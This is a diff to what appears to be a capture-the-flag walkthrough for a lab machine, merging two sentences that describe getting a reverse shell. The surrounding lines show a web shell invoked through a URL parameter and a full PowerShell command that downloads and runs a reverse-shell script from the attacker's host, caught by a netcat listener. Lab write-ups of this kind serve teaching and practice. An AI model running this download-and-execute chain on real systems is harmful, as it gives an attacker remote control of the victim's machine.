@@ -62,9 +62,7 @@ and upload it to the share. Visiting the URL `http://10.10.10.97:8808/shell.php?
 
 <img src="images/rce.png">
 
-From here I'll write a powershell reverse shell in `shell.ps1` to call back to port 9001 on my box and host it on a python webserver. 
-
-I'll start a netcat listener on port 9001, then I'll visit the URL 
+From here I'll write a powershell reverse shell in `shell.ps1` to call back to port 9001 on my box and host it on a python webserver. I'll start a netcat listener on port 9001, then I'll visit the URL 
 
 `http://10.10.10.97:8808/shell.php?cmd=powershell iex(iwr -uri http://10.10.14.31/shell.ps1 -usebasicparsing)`
 
